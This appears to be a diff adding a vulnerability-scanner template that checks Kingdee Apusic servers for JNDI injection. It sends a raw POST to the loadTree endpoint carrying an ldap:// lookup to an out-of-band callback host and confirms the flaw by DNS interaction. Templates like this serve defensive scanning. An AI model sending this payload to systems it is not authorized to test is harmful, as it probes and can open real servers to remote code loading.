@@ -1,0 +1,30 @@
+id: poc-yaml-kingdee-apusic-loadtree-jndi
+info:
+  name: Kingdee Apusic loadTree JNDI Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,command-injection
+  description: |
+    Detects potential JNDI injection vulnerability in Kingdee Apusic server through the /admin//protect/jndi/loadTree endpoint.
+
+http:
+  - raw:
+      - |
+        POST /admin//protect/jndi/loadTree HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        jndiName=ldap%3a//{{interactsh-url}}/123.jpg
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "text/html"
+        part: header
+    extractors:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'dns'"
